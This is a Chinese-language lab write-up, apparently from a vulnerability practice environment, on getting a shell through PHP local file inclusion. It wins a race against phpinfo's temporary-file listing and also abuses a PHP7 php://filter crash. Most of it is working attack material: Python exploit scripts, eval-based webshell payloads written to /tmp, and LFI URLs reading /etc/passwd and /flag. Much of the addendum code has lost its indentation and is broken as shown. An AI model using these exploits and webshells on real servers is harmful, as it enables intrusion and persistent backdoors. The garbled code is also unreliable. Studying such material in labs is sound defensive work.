# PHP文件包含漏洞（利用phpinfo）

PHP文件包含漏洞中，如果找不到可以包含的文件，我们可以通过包含临时文件的方法来getshell。因为临时文件名是随机的，如果目标网站上存在phpinfo，则可以通过phpinfo来获取临时文件名，进而进行包含。

参考链接：

- https://dl.packetstormsecurity.net/papers/general/LFI_With_PHPInfo_Assitance.pdf

## 漏洞环境

执行如下命令启动环境：

```
docker-compose up -d
```

目标环境是官方最新版PHP7.2，说明该漏洞与PHP版本无关。

环境启动后，访问`http://your-ip:8080/phpinfo.php`即可看到一个PHPINFO页面，访问`http://your-ip:8080/lfi.php?file=/etc/passwd`，可见的确存在文件包含漏洞。

## 利用方法简述

在给PHP发送POST数据包时，如果数据包里包含文件区块，无论你访问的代码中有没有处理文件上传的逻辑，PHP都会将这个文件保存成一个临时文件（通常是`/tmp/php[6个随机字符]`），文件名可以在`$_FILES`变量中找到。这个临时文件，在请求结束后就会被删除。

同时，因为phpinfo页面会将当前请求上下文中所有变量都打印出来，所以我们如果向phpinfo页面发送包含文件区块的数据包，则即可在返回包里找到`$_FILES`变量的内容，自然也包含临时文件名。

在文件包含漏洞找不到可利用的文件时，即可利用这个方法，找到临时文件名，然后包含之。

但文件包含漏洞和phpinfo页面通常是两个页面，理论上我们需要先发送数据包给phpinfo页面，然后从返回页面中匹配出临时文件名，再将这个文件名发送给文件包含漏洞页面，进行getshell。在第一个请求结束时，临时文件就被删除了，第二个请求自然也就无法进行包含。

这个时候就需要用到条件竞争，具体流程如下：

1. 发送包含了webshell的上传数据包给phpinfo页面，这个数据包的header、get等位置需要塞满垃圾数据
2. 因为phpinfo页面会将所有数据都打印出来，1中的垃圾数据会将整个phpinfo页面撑得非常大
3. php默认的输出缓冲区大小为4096，可以理解为php每次返回4096个字节给socket连接
4. 所以，我们直接操作原生socket，每次读取4096个字节。只要读取到的字符里包含临时文件名，就立即发送第二个数据包
5. 此时，第一个数据包的socket连接实际上还没结束，因为php还在继续每次输出4096个字节，所以临时文件此时还没有删除
6. 利用这个时间差，第二个数据包，也就是文件包含漏洞的利用，即可成功包含临时文件，最终getshell

## 漏洞复现

利用脚本[exp.py](exp.py)实现了上述过程，成功包含临时文件后，会执行`<?php file_put_contents('/tmp/g', '<?=eval($_REQUEST[1])?>')?>`，写入一个新的文件`/tmp/g`，这个文件就会永久留在目标机器上。

用python2执行：`python exp.py your-ip 8080 100`：

![](1.png)

可见，执行到第289个数据包的时候就写入成功。然后，利用lfi.php，即可执行任意命令：

![](2.png)

补充说明:

phpinfo+LFI

我们有文件包含，那么我们可以轻易的给代码写后门：

`file=php://filter/read=convert.base64-encode/resource=index.php`

最容易想到的是利用包含：

`http://ip/index.php?file=/flag`

即利用phpinfo会打印上传缓存文件路径的特性，进行缓存文件包含达到getshell的目的。

我们简单写一个测试脚本：
`
import requests
from io import BytesIO
files = {
  'file': BytesIO("<?php echo '_POST is cool!';")
}
url = "http://ip/phpinfo.php"
r = requests.post(url=url, files=files, allow_redirects=False)
data = re.search(r"(?<=tmp_name] =&gt; ).*", r.content).group(0)
#打印
#print r.content
print data
`
我们选择包含后写入文件的shell：

`<?php file_put_contents('/tmp/_POST', '<?php @eval($_POST[_GET]);?>');?>`

尝试进行exp编写：
`
import os
import socket
import sys
def init(host,port):
padding = '_POST'*2000
payload="""_POST test!<?php file_put_contents('/tmp/_POST', '<?php eval($_REQUEST[_POST]);?>');?>\r"""
request1_data ="""------WebKitFormBoundary9MWZnWxBey8mbAQ8\r
Content-Disposition: form-data; name="file"; filename="test.php"\r
Content-Type: text/php\r
\r
%s
------WebKitFormBoundary9MWZnWxBey8mbAQ8\r
Content-Disposition: form-data; name="submit"\r
\r
Submit\r
------WebKitFormBoundary9MWZnWxBey8mbAQ8--\r
""" % payload
request1 = """POST /phpinfo.php?a="""+padding+""" HTTP/1.1\r
Cookie: _POSTpadding="""+padding+"""\r
Cache-Control: max-age=0\r
Upgrade-Insecure-Requests: 1\r
Origin: null\r
Accept: """ + padding + """\r
User-Agent: """+padding+"""\r
Accept-Language: """+padding+"""\r
HTTP_PRAGMA: """+padding+"""\r
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9MWZnWxBey8mbAQ8\r
Content-Length: %s\r
Host: %s:%s\r
\r
%s""" %(len(request1_data),host,port,request1_data)
request2 = """GET /index.php?file=%s HTTP/1.1\r
User-Agent: Mozilla/4.0\r
Proxy-Connection: Keep-Alive\r
Host: %s:%s\r
\r
\r
"""
return (request1,request2)
def getOffset(host,port,request1):
    """Gets offset of tmp_name in the php output"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    s.send(request1)
    d = ""
    while True:
        i = s.recv(4096)
        d+=i       
        if i == "":
            break
        if i.endswith("0\r\n\r\n"):
            break
    s.close()
    i = d.find("[tmp_name] =&gt; ")
    if i == -1:
        print 'not fonud'
    
    print "found %s at %i" % (d[i:i+10],i)
    return i+256
def phpinfo_LFI(host,port,offset,request1,request2):
s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s1.connect((host,port))
s2.connect((host,port))
s1.send(request1)
d = ""
while len(d) < offset:
d += s1.recv(offset)
try:
i = d.index("[tmp_name] =&gt; ")
fn = d[i+17:i+31]
s2.send(request2 % (fn,host,port))
tmp = s2.recv(4096)
if tmp.find("_POST test!") != -1:
return fn
except ValueError:
    return None
s1.close()
s2.close()
attempts = 1000
host = "ip"
port = "port"
request1,request2 = init(host,port)
offset = getOffset(host,port,request1)
for i in range(1,attempts):
print "try:"+str(i)+"/"+str(attempts)
sys.stdout.flush()
res = phpinfo_LFI(host,port,offset,request1,request2)
if res is not None:
print 'You can getshell with /tmp/_POST!'
break
`
LFI+php7崩溃

前一题我们能做，得益于phpinfo的存在，但如果没有phpinfo的存在，我们就很难利用上述方法去getshell。

但如果目标不存在phpinfo，应该如何处理呢？

这里可以用php7 segment fault特性。

我们可以利用：

`http://ip/index.php?file=php://filter/string.strip_tags=/etc/passwd`

加上我们有dir.php
`
<?php
$a = @$_GET['dir'];
if(!$a){
$a = '/tmp';
}
var_dump(scandir($a));
`
可以进行目录列举，我们只要找到临时文件名即可：

编写exp
`
import requests
from io import BytesIO
import re
files = {
  'file': BytesIO('<?php eval($_REQUEST[_POST]);')
}
url = 'http://ip/index.php?file=php://filter/string.strip_tags/resource=/etc/passwd'
try:
r = requests.post(url=url, files=files, allow_redirects=False)
except:
url = 'http://ip/dir.php'
r = requests.get(url)
data = re.search(r"php[a-zA-Z0-9]{1,}", r.content).group(0)
url = "http://ip/index.php?file=/tmp/"+data
data = {
'_POST':"readfile('/flag');"
}
r =  requests.post(url=url,data=data)
print r.content
`
